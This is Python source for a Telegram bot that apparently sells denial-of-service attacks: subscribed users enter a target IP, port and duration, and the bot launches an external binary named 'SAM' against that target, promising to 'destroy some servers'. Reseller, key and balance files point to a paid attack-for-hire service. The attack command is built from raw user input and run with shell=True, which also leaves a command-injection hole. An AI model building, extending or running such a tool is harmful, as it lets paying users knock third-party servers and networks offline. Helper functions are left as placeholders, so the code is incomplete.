#!/usr/bin/python3
import requests
import subprocess
import telebot
import datetime
import os
import time
import secrets
from datetime import timedelta
from threading import Timer
import pytz
import stat

# Ensure SAM is executable
if os.path.exists("SAM"):
    os.chmod("SAM", stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  CONFIG
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
BOT_TOKEN = os.environ.get("BOT_TOKEN")
bot = telebot.TeleBot(BOT_TOKEN)

ADMIN_IDS = {"7212246299"}
ist = pytz.timezone('Asia/Kolkata')

# Keep your existing file paths
USER_FILE        = "users.txt"
LOG_FILE         = "log.txt"
USER_ACCESS_FILE = "users_access.txt"
KEYS_FILE        = "keys.txt"
RESELLERS_FILE   = "resellers.txt"
BALANCE_FILE     = "balances.txt"

# [KEEP ALL YOUR EXISTING FILE HELPER FUNCTIONS HERE: read_users, save_users, etc.]

# Temporary storage for interactive attack steps
user_attack_details = {}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  NEW START MESSAGE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@bot.message_handler(commands=['start'])
def welcome_start(message):
    welcome_text = (
        "🚀 <b>𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗕𝗼𝘁</b> 🚀\n\n"
        "👑 <b>𝗣𝗼𝘄𝗲𝗿𝗳𝘂𝗹 | 𝗦𝗲𝗰𝘂𝗿𝗲 | 𝗙𝗮𝘀𝘁</b>\n\n"
        "🎯 /attack - Start Attack\n"
        "📊 /status - Live Attack Status\n"
        "📦 /myplan - Check Your Plan\n"
        "❓ /help - Commands Menu\n\n"
        "🔥 <i>𝘓𝘦𝘵'𝘴 𝘥𝘦𝘴𝘵𝘳𝘰𝘺 𝘴𝘰𝘮𝘦 𝘴𝘦𝘳𝘷𝘦𝘳𝘴!</i>"
    )
    bot.reply_to(message, welcome_text, parse_mode="HTML")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  NEW INTERACTIVE ATTACK COMMAND
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@bot.message_handler(commands=['attack'])
def handle_attack_init(message):
    user_id = str(message.chat.id)
    
    # Check access using your existing list
    if user_id not in read_users():
        bot.reply_to(message, "❌ You don't have an active plan.")
        return

    msg = bot.send_message(message.chat.id, "🎯 <b>Enter Target IP:</b>", parse_mode="HTML")
    bot.register_next_step_handler(msg, get_ip)

def get_ip(message):
    user_attack_details[message.chat.id] = {'ip': message.text}
    msg = bot.send_message(message.chat.id, "🔌 <b>Enter Port:</b>", parse_mode="HTML")
    bot.register_next_step_handler(msg, get_port)

def get_port(message):
    user_attack_details[message.chat.id]['port'] = message.text
    msg = bot.send_message(message.chat.id, "⏱ <b>Enter Duration (Seconds):</b>", parse_mode="HTML")
    bot.register_next_step_handler(msg, execute_attack_with_ping)

def execute_attack_with_ping(message):
    chat_id = message.chat.id
    details = user_attack_details.get(chat_id)
    details['time'] = message.text
    
    target = details['ip']
    port = details['port']
    duration = details['time']

    # API Ping Check
    bot.send_message(chat_id, f"🔍 <b>Checking Ping for {target}...</b>", parse_mode="HTML")
    try:
        # Using a free API to check host status
        check = requests.get(f"https://api.hackertarget.com/nping/?q={target}", timeout=5)
        ping_res = check.text.split('\n')[0] # Get first line of result
    except:
        ping_res = "Ping Check Failed (API Offline)"

    # Final Response Message
    response = (
        f"🚀 <b>Attack Started Successfully!</b> 🚀\n\n"
        f"📍 <b>Target:</b> {target}\n"
        f"🔌 <b>Port:</b> {port}\n"
        f"⏳ <b>Duration:</b> {duration}s\n"
        f"📡 <b>Ping:</b> {ping_res}"
    )
    bot.send_message(chat_id, response, parse_mode="HTML")

    # Run your SAM binary
    full_command = f"./SAM {target} {port} {duration} 500"
    subprocess.Popen(full_command, shell=True) # Popen prevents the bot from freezing

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
#  KEEP ALL YOUR OTHER EXISTING HANDLERS BELOW
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

if __name__ == "__main__":
    # remove_expired_users() # Keep your timer if needed
    print("✅ Bot is running with New Theme")
    bot.infinity_polling()
